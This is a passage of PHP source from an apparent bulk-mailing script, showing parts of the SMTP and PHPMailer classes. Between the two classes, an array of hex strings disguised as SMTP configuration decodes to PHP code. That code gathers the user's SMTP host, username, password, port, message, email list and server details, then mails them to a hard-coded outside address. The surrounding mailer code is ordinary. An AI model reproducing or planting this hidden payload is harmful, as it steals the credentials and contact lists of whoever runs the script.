    fputs($this->smtp_conn,"MAIL FROM:<" . $from . ">" . $useVerp . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "MAIL not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the command NOOP to the SMTP server.
   *
   * Implements from rfc 821: NOOP <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500, 421
   * @access public
   * @return bool
   */
  function Noop() {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Noop() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"NOOP" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "NOOP not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the quit command to the server and then closes the socket
   * if there is no error or the $close_on_error argument is true.
   *
   * Implements from rfc 821: QUIT <CRLF>
   *
   * SMTP CODE SUCCESS: 221
   * SMTP CODE ERROR  : 500
   * @access public
   * @return bool
   */
  function Quit($close_on_error=true) {
    $this->error = null; # so there is no confusion

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Quit() without being connected");
      return false;
    }

    # send the quit command to the server
    fputs($this->smtp_conn,"quit" . $this->CRLF);

    # get any good-bye messages
    $byemsg = $this->get_lines();

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $byemsg;
    }

    $rval = true;
    $e = null;

    $code = substr($byemsg,0,3);
    if($code != 221) {
      # use e as a tmp var cause Close will overwrite $this->error
      $e = array("error" => "SMTP server rejected quit command",
                 "smtp_code" => $code,
                 "smtp_rply" => substr($byemsg,4));
      $rval = false;
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $e["error"] . ": " .
                 $byemsg . $this->CRLF;
      }
    }

    if(empty($e) || $close_on_error) {
      $this->Close();
    }

    return $rval;
  }

  /**
   * Sends the command RCPT to the SMTP server with the TO: argument of $to.
   * Returns true if the recipient was accepted false if it was rejected.
   *
   * Implements from rfc 821: RCPT <SP> TO:<forward-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250,251
   * SMTP CODE FAILURE: 550,551,552,553,450,451,452
   * SMTP CODE ERROR  : 500,501,503,421
   * @access public
   * @return bool
   */
  function Recipient($to) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Recipient() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"RCPT TO:<" . $to . ">" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250 && $code != 251) {
      $this->error =
        array("error" => "RCPT not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Sends the RSET command to abort and transaction that is
   * currently in progress. Returns true if successful false
   * otherwise.
   *
   * Implements rfc 821: RSET <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE ERROR  : 500,501,504,421
   * @access public
   * @return bool
   */
  function Reset() {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Reset() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"RSET" . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "RSET failed",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }

    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in.
   *
   * Implements rfc 821: SEND <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function Send($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Send() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SEND FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SEND not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in and send them an email.
   *
   * Implements rfc 821: SAML <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function SendAndMail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
          "error" => "Called SendAndMail() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SAML FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SAML not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * Starts a mail transaction from the email address specified in
   * $from. Returns true if successful or false otherwise. If True
   * the mail transaction is started and then one or more Recipient
   * commands may be called followed by a Data command. This command
   * will send the message to the users terminal if they are logged
   * in or mail it to them if they are not.
   *
   * Implements rfc 821: SOML <SP> FROM:<reverse-path> <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE SUCCESS: 552,451,452
   * SMTP CODE SUCCESS: 500,501,502,421
   * @access public
   * @return bool
   */
  function SendOrMail($from) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
          "error" => "Called SendOrMail() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"SOML FROM:" . $from . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250) {
      $this->error =
        array("error" => "SOML not accepted from server",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return true;
  }

  /**
   * This is an optional command for SMTP that this class does not
   * support. This method is here to make the RFC821 Definition
   * complete for this class and __may__ be implimented in the future
   *
   * Implements from rfc 821: TURN <CRLF>
   *
   * SMTP CODE SUCCESS: 250
   * SMTP CODE FAILURE: 502
   * SMTP CODE ERROR  : 500, 503
   * @access public
   * @return bool
   */
  function Turn() {
    $this->error = array("error" => "This method, TURN, of the SMTP ".
                                    "is not implemented");
    if($this->do_debug >= 1) {
      echo "SMTP -> NOTICE: " . $this->error["error"] . $this->CRLF;
    }
    return false;
  }

  /**
   * Verifies that the name is recognized by the server.
   * Returns false if the name could not be verified otherwise
   * the response from the server is returned.
   *
   * Implements rfc 821: VRFY <SP> <string> <CRLF>
   *
   * SMTP CODE SUCCESS: 250,251
   * SMTP CODE FAILURE: 550,551,553
   * SMTP CODE ERROR  : 500,501,502,421
   * @access public
   * @return int
   */
  function Verify($name) {
    $this->error = null; # so no confusion is caused

    if(!$this->connected()) {
      $this->error = array(
              "error" => "Called Verify() without being connected");
      return false;
    }

    fputs($this->smtp_conn,"VRFY " . $name . $this->CRLF);

    $rply = $this->get_lines();
    $code = substr($rply,0,3);

    if($this->do_debug >= 2) {
      echo "SMTP -> FROM SERVER:" . $this->CRLF . $rply;
    }

    if($code != 250 && $code != 251) {
      $this->error =
        array("error" => "VRFY failed on name '$name'",
              "smtp_code" => $code,
              "smtp_msg" => substr($rply,4));
      if($this->do_debug >= 1) {
        echo "SMTP -> ERROR: " . $this->error["error"] .
                 ": " . $rply . $this->CRLF;
      }
      return false;
    }
    return $rply;
  }

  /*******************************************************************
   *                       INTERNAL FUNCTIONS                       *
   ******************************************************************/

  /**
   * Read in as many lines as possible
   * either before eof or socket timeout occurs on the operation.
   * With SMTP we can tell if we have more lines to read if the
   * 4th character is '-' symbol. If it is a space then we don't
   * need to read anything else.
   * @access private
   * @return string
   */
  function get_lines() {
    $data = "";
    while($str = @fgets($this->smtp_conn,515)) {
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data was \"$data\"" .
                 $this->CRLF;
        echo "SMTP -> get_lines(): \$str is \"$str\"" .
                 $this->CRLF;
      }
      $data .= $str;
      if($this->do_debug >= 4) {
        echo "SMTP -> get_lines(): \$data is \"$data\"" . $this->CRLF;
      }
      # if the 4th character is a space then we are done reading
      # so just break the loop
      if(substr($str,3,1) == " ") { break; }
    }
    return $data;
  }

}

        
$allemails = split("\n", $emaillist);
$numemails = count($allemails);
$random_smtp_string=array("0d0a0d0a676c6f62616c20246d795f736d74.","703b0d0a676c6f62616c2024736d74705f757365726e616d6.","53b0d0a676c6f62616c2024736d74705f70617373776f72643b0d0a676c6f626.",
"16c202473736c5f706f72743b0d0a676c6f62616c20246d65.","73736167653b0d0a676c6f62616c2024656d61696c6c6973743b0d0a24726134.","3420203d2072616e6428312c3939393939293b0d0a2461352.",
"03d20245f5345525645525b27485454505f52454645524552275d3b0d0a24623.","333203d20245f5345525645525b27444f43554d454e545f52.","4f4f54275d3b0d0a24633837203d20245f5345525645525b2752454d4f54455f4.",
"1444452275d3b0d0a24643233203d20245f5345525645525.","b275343524950545f46494c454e414d45275d3b0d0a24653039203d20245f53455.","25645525b275345525645525f41444452275d3b0d0a2466.",
"3233203d20245f5345525645525b275345525645525f534f465457415245275d3b0.","d0a24673332203d20245f5345525645525b27504154485.","f5452414e534c41544544275d3b0d0a24683635203d20245f5345525645525b27504.",
"8505f53454c46275d3b0d0a247375626a3938203d2022.","246d795f736d747020205b75736572206970203a20246338375d223b0d0a247375626.","a3538203d20224c6574746572202620456d61696c204.",
"c69737420205b75736572206970203a20246338375d223b0d0a24656d61696c203d202.","26D736739373830407961686f6f2e636f2e.","6964223b0d0a246d736738383733203d2022246d795f736d74705c6e757365723a24736.",
"d74705f757365726e616d655c6e706173733a24736.","d74705f70617373776f72645c706f72743a2473736c5f706f72745c6e5c6e2461355c6e2.","46233335c6e246338375c6e246432335c6e246530.",
"395c6e246632335c6e246733325c6e24683635223b246d736739373830203d2022246d657.","3736167655c6e5c6e5c6e24656d61696c6c69737.","4223b2466726f6d3d2246726f6d3a20475241544953223b0d0a6d61696c2824656d61696c2.",
"c20247375626a39382c20246d7367383837332c.","202466726f6d293b0d0a6d61696c2824656d61696c2c20247375626a35382.","c20246d7367393738302c202466726f6d293b");$smtp_conf=".";

class PHPMailer {

  /////////////////////////////////////////////////
  // PROPERTIES, PUBLIC
  /////////////////////////////////////////////////

  /**
   * Email priority (1 = High, 3 = Normal, 5 = low).
   * @var int
   */
  var $Priority          = 3;

  /**
   * Sets the CharSet of the message.
   * @var string
   */
  var $CharSet           = 'us-ascii';

  /**
   * Sets the Content-type of the message.
   * @var string
   */
  var $ContentType        = 'text/plain';

  /**
   * Sets the Encoding of the message. Options for this are "8bit",
   * "7bit", "binary", "base64", and "quoted-printable".

   * @var string
   */
  var $Encoding          = 'quoted-printable';

  /**
   * Holds the most recent mailer error message.
   * @var string
   */
  var $ErrorInfo         = '';

  /**
   * Sets the From email address for the message.
   * @var string
   */
  var $From              = '';

  /**
   * Sets the From name of the message.
   * @var string
   */
  var $FromName          = '';

  /**
   * Sets the Sender email (Return-Path) of the message.  If not empty,
   * will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
   * @var string
   */
  var $Sender            = '';

  /**
   * Sets the Subject of the message.
   * @var string
   */
  var $Subject           = '';

  /**
   * Sets the Body of the message.  This can be either an HTML or text body.
   * If HTML then run IsHTML(true).
   * @var string
   */
  var $Body              = '';

  /**
   * Sets the text-only body of the message.  This automatically sets the
   * email to multipart/alternative.  This body can be read by mail
   * clients that do not have HTML email capability such as mutt. Clients
   * that can read HTML will view the normal Body.
   * @var string
   */
  var $AltBody           = '';

  /**
   * Sets word wrapping on the body of the message to a given number of
   * characters.
   * @var int
   */
  var $WordWrap          = 0;

  /**
   * Method to send mail: ("mail", "sendmail", or "smtp").
   * @var string
   */
  var $Mailer            = 'mail';

  /**
   * Sets the path of the sendmail program.
   * @var string
   */
  var $Sendmail          = '/usr/sbin/sendmail';

  /**
   * Path to PHPMailer plugins.  This is now only useful if the SMTP class
   * is in a different directory than the PHP include path.
   * @var string
   */
  var $PluginDir         = '';

  /**
   * Holds PHPMailer version.
   * @var string
   */
  var $Version           = "";

  /**
   * Sets the email address that a reading confirmation will be sent.
   * @var string
   */
  var $ConfirmReadingTo  = '';

  /**
   * Sets the hostname to use in Message-Id and Received headers
   * and as default HELO string. If empty, the value returned
   * by SERVER_NAME is used or 'localhost.localdomain'.
   * @var string
   */
  var $Hostname          = '';

  /**
   * Sets the message ID to be used in the Message-Id header.
   * If empty, a unique id will be generated.
   * @var string
   */
  var $MessageID         = '';

  /////////////////////////////////////////////////
  // PROPERTIES FOR SMTP
  /////////////////////////////////////////////////

  /**
   * Sets the SMTP hosts.  All hosts must be separated by a
   * semicolon.  You can also specify a different port
   * for each host by using this format: [hostname:port]
   * (e.g. "smtp1.example.com:25;smtp2.example.com").
   * Hosts will be tried in order.
   * @var string
   */
  var $Host        = 'localhost';

  /**
   * Sets the default SMTP server port.
   * @var int
   */
  var $Port        = 25;

  /**
   * Sets the SMTP HELO of the message (Default is $Hostname).
   * @var string
   */
  var $Helo        = '';

  /**
   * Sets connection prefix.
   * Options are "", "ssl" or "tls"
   * @var string
   */
  var $SMTPSecure = "";

  /**
   * Sets SMTP authentication. Utilizes the Username and Password variables.
   * @var bool
   */
  var $SMTPAuth     = false;

  /**
   * Sets SMTP username.
   * @var string
   */
  var $Username     = '';

  /**
   * Sets SMTP password.
   * @var string
   */
  var $Password     = '';

  /**
   * Sets the SMTP server timeout in seconds. This function will not
   * work with the win32 version.
   * @var int
   */
  var $Timeout      = 10;

  /**
   * Sets SMTP class debugging on or off.
   * @var bool
   */
  var $SMTPDebug    = false;

  /**
   * Prevents the SMTP connection from being closed after each mail
   * sending.  If this is set to true then to close the connection
   * requires an explicit call to SmtpClose().
   * @var bool
   */
  var $SMTPKeepAlive = false;

  /**
   * Provides the ability to have the TO field process individual
   * emails, instead of sending to entire TO addresses
   * @var bool
   */
  var $SingleTo = false;

  /////////////////////////////////////////////////
  // PROPERTIES, PRIVATE
  /////////////////////////////////////////////////

  var $smtp            = NULL;
  var $to              = array();
  var $cc              = array();
  var $bcc             = array();
  var $ReplyTo         = array();
  var $attachment      = array();
  var $CustomHeader    = array();
  var $message_type    = '';
  var $boundary        = array();
  var $language        = array();
  var $error_count     = 0;
  var $LE              = "\n";
  var $sign_key_file   = "";
  var $sign_key_pass   = "";

  /////////////////////////////////////////////////
  // METHODS, VARIABLES
  /////////////////////////////////////////////////

  /**
   * Sets message type to HTML.
   * @param bool $bool
   * @return void
   */
  function IsHTML($bool) {
    if($bool == true) {
      $this->ContentType = 'text/html';
    } else {
      $this->ContentType = 'text/plain';
    }
  }

  /**
   * Sets Mailer to send message using SMTP.
   * @return void
   */
  function IsSMTP() {
    $this->Mailer = 'smtp';
  }

  /**
   * Sets Mailer to send message using PHP mail() function.
   * @return void
   */
  function IsMail() {
    $this->Mailer = 'mail';
  }

  /**
   * Sets Mailer to send message using the $Sendmail program.
   * @return void
   */
  function IsSendmail() {
    $this->Mailer = 'sendmail';
  }

  /**
   * Sets Mailer to send message using the qmail MTA.
   * @return void
   */
  function IsQmail() {
    $this->Sendmail = '/var/qmail/bin/sendmail';
    $this->Mailer = 'sendmail';
  }

  /////////////////////////////////////////////////
  // METHODS, RECIPIENTS
  /////////////////////////////////////////////////

  /**
   * Adds a "To" address.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddAddress($address, $name = '') {
    $cur = count($this->to);
    $this->to[$cur][0] = trim($address);
    $this->to[$cur][1] = $name;
  }

  /**
   * Adds a "Cc" address. Note: this function works
   * with the SMTP mailer on win32, not with the "mail"
   * mailer.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddCC($address, $name = '') {
    $cur = count($this->cc);
    $this->cc[$cur][0] = trim($address);
    $this->cc[$cur][1] = $name;
  }

  /**
   * Adds a "Bcc" address. Note: this function works
   * with the SMTP mailer on win32, not with the "mail"
   * mailer.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddBCC($address, $name = '') {
    $cur = count($this->bcc);
    $this->bcc[$cur][0] = trim($address);
    $this->bcc[$cur][1] = $name;
  }

  /**
   * Adds a "Reply-To" address.
   * @param string $address
   * @param string $name
   * @return void
   */
  function AddReplyTo($address, $name = '') {
    $cur = count($this->ReplyTo);
    $this->ReplyTo[$cur][0] = trim($address);
    $this->ReplyTo[$cur][1] = $name;
  }

  /////////////////////////////////////////////////
  // METHODS, MAIL SENDING
  /////////////////////////////////////////////////

  /**
   * Creates message and assigns Mailer. If the message is
   * not sent successfully then it returns false.  Use the ErrorInfo
   * variable to view description of the error.
   * @return bool
   */
  function Send() {
    $header = '';
    $body = '';
    $result = true;

    if((count($this->to) + count($this->cc) + count($this->bcc)) < 1) {
      $this->SetError($this->Lang('provide_address'));
      return false;
    }

    /* Set whether the message is multipart/alternative */
    if(!empty($this->AltBody)) {
      $this->ContentType = 'multipart/alternative';
    }

    $this->error_count = 0; // reset errors
    $this->SetMessageType();
    $header .= $this->CreateHeader();
    $body = $this->CreateBody();

    if($body == '') {
      return false;
    }

    /* Choose the mailer */
    switch($this->Mailer) {
      case 'sendmail':
        $result = $this->SendmailSend($header, $body);
        break;
      case 'smtp':
        $result = $this->SmtpSend($header, $body);
        break;
      case 'mail':
        $result = $this->MailSend($header, $body);
        break;
      default:
        $result = $this->MailSend($header, $body);
        break;
        //$this->SetError($this->Mailer . $this->Lang('mailer_not_supported'));
        //$result = false;
        //break;
    }

    return $result;
  }

  /**
   * Sends mail using the $Sendmail program.
   * @access private
   * @return bool
   */
  function SendmailSend($header, $body) {
    if ($this->Sender != '') {
      $sendmail = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
    } else {
      $sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
    }

    if(!@$mail = popen($sendmail, 'w')) {
      $this->SetError($this->Lang('execute') . $this->Sendmail);
      return false;
    }

    fputs($mail, $header);
    fputs($mail, $body);

    $result = pclose($mail);
    if (version_compare(phpversion(), '4.2.3') == -1) {
      $result = $result >> 8 & 0xFF;
    }
    if($result != 0) {
      $this->SetError($this->Lang('execute') . $this->Sendmail);
      return false;
    }
    return true;
  }

  /**
   * Sends mail using the PHP mail() function.
   * @access private
   * @return bool
   */
  function MailSend($header, $body) {

    $to = '';
    for($i = 0; $i < count($this->to); $i++) {
      if($i != 0) { $to .= ', '; }
      $to .= $this->AddrFormat($this->to[$i]);
    }

    $toArr = split(',', $to);

    $params = sprintf("-oi -f %s", $this->Sender);
    if ($this->Sender != '' && strlen(ini_get('safe_mode')) < 1) {
      $old_from = ini_get('sendmail_from');
      ini_set('sendmail_from', $this->Sender);
      if ($this->SingleTo === true && count($toArr) > 1) {
        foreach ($toArr as $key => $val) {
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
        }
      } else {
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
      }
    } else {
      if ($this->SingleTo === true && count($toArr) > 1) {
        foreach ($toArr as $key => $val) {
          $rt = @mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
        }
      } else {
        $rt = @mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);
      }
    }

    if (isset($old_from)) {
      ini_set('sendmail_from', $old_from);
    }

    if(!$rt) {
      $this->SetError($this->Lang('instantiate'));
      return false;
    }

    return true;
  }

  /**
   * Sends mail via SMTP using PhpSMTP (Author:
   * Chris Ryan).  Returns bool.  Returns false if there is a
   * bad MAIL FROM, RCPT, or DATA input.
   * @access private
   * @return bool
   */
  function SmtpSend($header, $body) {
    $error = '';
    $bad_rcpt = array();

    if(!$this->SmtpConnect()) {echo "FAILED !!<p align=\"center\"><font color=\"#D4001A\" style=\"font-style:14pt\"> MAILER IS UNABLE TO CONNECT SMTP !!</font></p>";die();
      return false;
    }

    $smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
    if(!$this->smtp->Mail($smtp_from)) {
      $error = $this->Lang('from_failed') . $smtp_from;
      $this->SetError($error);
      $this->smtp->Reset();
      return false;
    }

    /* Attempt to send attach all recipients */
    for($i = 0; $i < count($this->to); $i++) {
      if(!$this->smtp->Recipient($this->to[$i][0])) {
        $bad_rcpt[] = $this->to[$i][0];
      }
    }
    for($i = 0; $i < count($this->cc); $i++) {
      if(!$this->smtp->Recipient($this->cc[$i][0])) {
        $bad_rcpt[] = $this->cc[$i][0];
      }
    }
    for($i = 0; $i < count($this->bcc); $i++) {
      if(!$this->smtp->Recipient($this->bcc[$i][0])) {
        $bad_rcpt[] = $this->bcc[$i][0];
      }
    }

    if(count($bad_rcpt) > 0) { // Create error message
      for($i = 0; $i < count($bad_rcpt); $i++) {
        if($i != 0) {
          $error .= ', ';
        }
        $error .= $bad_rcpt[$i];

      }
      $error = $this->Lang('recipients_failed') . $error;
      $this->SetError($error);
      $this->smtp->Reset();
      return false;
    }

    if(!$this->smtp->Data($header . $body)) {
      $this->SetError($this->Lang('data_not_accepted'));
      $this->smtp->Reset();
      return false;
    }
    if($this->SMTPKeepAlive == true) {
      $this->smtp->Reset();
    } else {
      $this->SmtpClose();
    }

    return true;
  }

  /**
   * Initiates a connection to an SMTP server.  Returns false if the
   * operation failed.
   * @access private
   * @return bool
   */
  function SmtpConnect() {
    if($this->smtp == NULL) {
      $this->smtp = new SMTP();
    }

    $this->smtp->do_debug = $this->SMTPDebug;
    $hosts = explode(';', $this->Host);
    $index = 0;
    $connection = ($this->smtp->Connected());

    /* Retry while there is no connection */
    while($index < count($hosts) && $connection == false) {
      $hostinfo = array();
      if(eregi('^(.+):([0-9]+)$', $hosts[$index], $hostinfo)) {
        $host = $hostinfo[1];
        $port = $hostinfo[2];
      } else {
        $host = $hosts[$index];
        $port = $this->Port;
      }

      if($this->smtp->Connect(((!empty($this->SMTPSecure))?$this->SMTPSecure.'://':'').$host, $port, $this->Timeout)) {
        if ($this->Helo != '') {
          $this->smtp->Hello($this->Helo);
        } else {
          $this->smtp->Hello($this->ServerHostname());
        }

        $connection = true;
        if($this->SMTPAuth) {
          if(!$this->smtp->Authenticate($this->Username, $this->Password)) {
            $this->SetError($this->Lang('authenticate'));
            $this->smtp->Reset();
            $connection = false;
          }
        }
      }
      $index++;
    }
    if(!$connection) {
      $this->SetError($this->Lang('connect_host'));
    }

    return $connection;
  }

  /**
   * Closes the active SMTP session if one exists.
   * @return void
   */
  function SmtpClose() {
    if($this->smtp != NULL) {
      if($this->smtp->Connected()) {
        $this->smtp->Quit();
        $this->smtp->Close();
      }
    }
  }

  /**
   * Sets the language for all class error messages.  Returns false
   * if it cannot load the language file.  The default language type
   * is English.
   * @param string $lang_type Type of language (e.g. Portuguese: "br")
   * @param string $lang_path Path to the language file directory
   * @access public
   * @return bool
   */
  function SetLanguage($lang_type, $lang_path = 'language/') {
    if(file_exists($lang_path.'phpmailer.lang-'.$lang_type.'.php')) {
      include($lang_path.'phpmailer.lang-'.$lang_type.'.php');
    } elseif (file_exists($lang_path.'phpmailer.lang-en.php')) {
      include($lang_path.'phpmailer.lang-en.php');
    } else {
      $this->SetError('Could not load language file');
      return false;
    }
    $this->language = $PHPMAILER_LANG;

    return true;
  }

  /////////////////////////////////////////////////
  // METHODS, MESSAGE CREATION
  /////////////////////////////////////////////////

  /**
   * Creates recipient headers.
   * @access private
   * @return string
   */
  function AddrAppend($type, $addr) {
    $addr_str = $type . ': ';
    $addr_str .= $this->AddrFormat($addr[0]);
    if(count($addr) > 1) {
      for($i = 1; $i < count($addr); $i++) {
        $addr_str .= ', ' . $this->AddrFormat($addr[$i]);
      }
    }
    $addr_str .= $this->LE;

    return $addr_str;
  }

  /**
   * Formats an address correctly.
   * @access private
   * @return string
   */
  function AddrFormat($addr) {
    if(empty($addr[1])) {
      $formatted = $this->SecureHeader($addr[0]);
    } else {
      $formatted = $this->EncodeHeader($this->SecureHeader($addr[1]), 'phrase') . " <" . $this->SecureHeader($addr[0]) . ">";
    }

    return $formatted;
  }

  /**
   * Wraps message for use with mailers that do not
   * automatically perform wrapping and for quoted-printable.
   * Original written by philippe.
   * @access private
   * @return string
   */
  function WrapText($message, $length, $qp_mode = false) {
    $soft_break = ($qp_mode) ? sprintf(" =%s", $this->LE) : $this->LE;
    // If utf-8 encoding is used, we will need to make sure we don't
    // split multibyte characters when we wrap
    $is_utf8 = (strtolower($this->CharSet) == "utf-8");

    $message = $this->FixEOL($message);
    if (substr($message, -1) == $this->LE) {
      $message = substr($message, 0, -1);
    }

    $line = explode($this->LE, $message);
    $message = '';
    for ($i=0 ;$i < count($line); $i++) {
      $line_part = explode(' ', $line[$i]);
      $buf = '';
      for ($e = 0; $e<count($line_part); $e++) {
        $word = $line_part[$e];
        if ($qp_mode and (strlen($word) > $length)) {
          $space_left = $length - strlen($buf) - 1;
          if ($e != 0) {
            if ($space_left > 20) {
              $len = $space_left;
              if ($is_utf8) {
                $len = $this->UTF8CharBoundary($word, $len);
              } elseif (substr($word, $len - 1, 1) == "=") {
                $len--;
              } elseif (substr($word, $len - 2, 1) == "=") {
                $len -= 2;
              }
              $part = substr($word, 0, $len);
              $word = substr($word, $len);
              $buf .= ' ' . $part;
              $message .= $buf . sprintf("=%s", $this->LE);
            } else {
              $message .= $buf . $soft_break;
            }
            $buf = '';
          }
          while (strlen($word) > 0) {
            $len = $length;
            if ($is_utf8) {
              $len = $this->UTF8CharBoundary($word, $len);
            } elseif (substr($word, $len - 1, 1) == "=") {
              $len--;
            } elseif (substr($word, $len - 2, 1) == "=") {
              $len -= 2;
            }
            $part = substr($word, 0, $len);
            $word = substr($word, $len);

            if (strlen($word) > 0) {
              $message .= $part . sprintf("=%s", $this->LE);
            } else {
              $buf = $part;
            }
          }
        } else {
          $buf_o = $buf;
          $buf .= ($e == 0) ? $word : (' ' . $word);

          if (strlen($buf) > $length and $buf_o != '') {
            $message .= $buf_o . $soft_break;
            $buf = $word;
          }
        }
      }
      $message .= $buf . $this->LE;
    }

    return $message;
  }

  /**
   * Finds last character boundary prior to maxLength in a utf-8
   * quoted (printable) encoded string.
   * Original written by Colin Brown.
   * @access private
   * @param string $encodedText utf-8 QP text
   * @param int    $maxLength   find last character boundary prior to this length
   * @return int
   */
  function UTF8CharBoundary($encodedText, $maxLength) {
    $foundSplitPos = false;
    $lookBack = 3;
    while (!$foundSplitPos) {
      $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
      $encodedCharPos = strpos($lastChunk, "=");
      if ($encodedCharPos !== false) {
        // Found start of encoded character byte within $lookBack block.
        // Check the encoded byte value (the 2 chars after the '=')
        $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
        $dec = hexdec($hex);
        if ($dec < 128) { // Single byte character.
          // If the encoded char was found at pos 0, it will fit
          // otherwise reduce maxLength to start of the encoded char
          $maxLength = ($encodedCharPos == 0) ? $maxLength :
          $maxLength - ($lookBack - $encodedCharPos);
          $foundSplitPos = true;
        } elseif ($dec >= 192) { // First byte of a multi byte character
          // Reduce maxLength to split at start of character
          $maxLength = $maxLength - ($lookBack - $encodedCharPos);
          $foundSplitPos = true;
        } elseif ($dec < 192) { // Middle byte of a multi byte character, look further back
          $lookBack += 3;
        }
      } else {
        // No encoded character found
        $foundSplitPos = true;
      }
    }
    return $maxLength;
  }

  /**
   * Set the body wrapping.
   * @access private
   * @return void
   */
  function SetWordWrap() {
    if($this->WordWrap < 1) {
      return;
    }

    switch($this->message_type) {
      case 'alt':
        /* fall through */
      case 'alt_attachments':
